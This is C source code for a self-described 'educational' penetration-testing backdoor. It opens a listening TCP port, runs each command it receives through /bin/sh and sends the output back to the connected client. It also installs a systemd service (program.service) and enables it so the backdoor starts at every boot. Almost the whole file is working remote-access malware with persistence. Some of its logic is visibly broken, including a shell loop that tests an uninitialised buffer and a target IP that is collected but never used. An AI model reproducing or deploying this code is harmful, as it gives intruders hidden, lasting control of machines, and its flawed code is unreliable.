/*
DISCLAIMER

WARNING: LEGAL USE AND CONSENT REQUIRED

This software is intended solely for educational purposes and security testing. 
It must only be used with the explicit written permission of the owners of the systems on which it will be executed. 
Unauthorized use of this software may violate local, national, 
and international laws regarding cybersecurity and unauthorized access to computer systems.
The author of this software assumes no responsibility for any direct
indirect, or consequential damages resulting from the use of this tool. 
The use of this program is the full responsibility of the user 
who is obligated to ensure that the software is used 
in compliance with applicable laws.

USE THIS SOFTWARE ONLY IF EXPLICIT PERMISSION HAS BEEN OBTAINED FROM THE SYSTEM OWNER.
*/

/*Author: riugxss
You can explore my programming projects on my GitHub: https://github.com/riugxssss
All of my programs are created for educational purposes and focused on penetration testing.
*/


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <ctype.h>

#define BUFFER 1024

typedef struct {
    int port_targ;
    char ip_address[100];
}info;

//Client handle for user with the shell
void client_handle(int client_addr){
    char buffer[BUFFER];
    ssize_t bytes_recv;
    ssize_t send_bytes;

    while (!strcmp(buffer, "exit")){
        send_bytes = send(client_addr, "shell>", 7, 0);
        if (send_bytes == -1){
            perror("Error sending the bytes");
            exit(1);
        }
        memset(buffer, 0, BUFFER);
        bytes_recv = recv(client_addr, buffer, BUFFER -1, 0);
        if (bytes_recv <= 0){
            perror("Error with receving the bytes");
            exit(1);
        }

        buffer[strcspn(buffer, "\n")] = '\0';

        if (strcmp(buffer, "exit") == 0){
            printf("Exiting..");
            exit(EXIT_SUCCESS);
        }

        pid_t pid;
        pid = fork();

        if (pid == 0){
            dup2(client_addr, STDOUT_FILENO);
            dup2(client_addr, STDERR_FILENO);
            close(client_addr);

            execl("/bin/sh", "sh", "-c", buffer, NULL);

            perror("Error with the command");
            exit(1);
        } else if (pid > 0){
            wait(NULL);
        } else {
            perror("Error with the fork");
            exit(-1);
        }

    }
    close(client_addr);
}
//Second function for the backdoor
int backdoor_func(info *data){
    int server_sock, client_sock;
    struct sockaddr_in s1, c1;
    
    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (server_sock == -1){
        perror("Error creating the socket\n");
        return 1;
    }
    s1.sin_family = AF_INET;
    s1.sin_addr.s_addr = INADDR_ANY;
    s1.sin_port = htons(data->port_targ);

    if (bind(server_sock, (struct sockaddr*)&s1, sizeof(s1)) == -1){
        perror("Error associating the socket with the port\n");
        close(server_sock);
        return 1;
    }

    if (listen(server_sock, 1) == -1){
        perror("Error listening\n");
        close(server_sock);
        return 1;
    }
    
    printf("Connection accepted on port: %d\n", data->port_targ);

    socklen_t lenaddr = sizeof(c1);
    client_sock = accept(server_sock, (struct sockaddr*)&c1, &lenaddr);
    if (client_sock == -1){
        perror("Error with the socket client\n");
        close(server_sock);
        return 1;
    }
    printf("Connection accepted from\t%s | %d\n", inet_ntoa(c1.sin_addr), ntohs(c1.sin_port));

    client_handle(client_sock);

    close(server_sock);

    return 0;
}
//check ip func
int isvalid(char *ip){
    struct sockaddr_in valid;
    return inet_pton(AF_INET, ip, &(valid.sin_addr)) != 0;
}
//main func w interactive menu
int main(){
    info *data = malloc(sizeof(info));
    if (data == NULL){
        perror("Error with the DAM\n");
        return 1;
    }

    int port_target;
    char IP_address[100];
    char num[50];
    int InteractiveMenu;
    const char *HELP = "\n\nUSAGE OF THIS PROGRAMM\n"
                        "IT'S ONLY FOR EDUCATION PURPOSE\n"
                        "FOR MORE INFO GITHUB: https://github.com/riugxssss\n"
                        "DEV: RIUGXS\n\n";

    while (InteractiveMenu != 2){
        printf("\033[1;37mOPTIONS\n1)\033[1;33mBACKDOOR\033[0m\n\033[1;37m2)\033[1;31mEXIT\n\033[0m\033[1;37m3)HELP\n\n");
        if (fgets(num, sizeof(num), stdin) != NULL){
            if (!sscanf(num, "%d", &InteractiveMenu) == 1){
                printf("[!] ONLY NUMBER ALLOWED\033[0m\n");
                return 1;
            }
        }
        switch (InteractiveMenu)
        {
        case 1:
           printf("Enter the Port target: \n");
        scanf("%d",&port_target);
    if (port_target > 65535 || port_target < 0){
        fprintf(stderr, "Port out of the range\n");
        free(data);
        return 1;
    }
        data->port_targ = port_target;

        printf("Enter the IP address of the target: \n");
        scanf("%s", IP_address);

        if (isvalid(IP_address)){
        printf("IP ADDRESS valid.\n");
        strcpy(data->ip_address, IP_address);
    } else {
        printf("IP address not valid\n");
        free(data);
        return 1;
    }
            printf("Startin the backdoor\n");
            backdoor_func(data);
    char *service_content = "[Unit]\n"
                             "Description=Service to run back function on boot\n"
                             "[Service]\n"
                             "ExecStart=%s\n"
                             "Restart=always\n"
                             "[Install]\n"
                             "WantedBy=multi-user.target\n";

    char program_path[256];
    realpath("./backdoor", program_path);  

    char service_file[256];
    snprintf(service_file, sizeof(service_file), "/etc/systemd/system/program.service");

    FILE *file = fopen(service_file, "w");
    if (file != NULL) {
        fprintf(file, service_content, program_path);
        fclose(file);

        system("systemctl daemon-reload");
        system("systemctl enable program.service");

        printf("The program has been registered for automatic boot execution.\n");
    } else {
        printf("Error creating the systemd service file.\n");
    }
            break;
        case 2:
            printf("Exiting..\n");
            exit(EXIT_SUCCESS);
            break;
        case 3:
            printf("%s\n", HELP);
            break;
        default:
            printf("[!] Invalid Choice.\n\n");
            break;
        }
    }
    
    return 0;
}
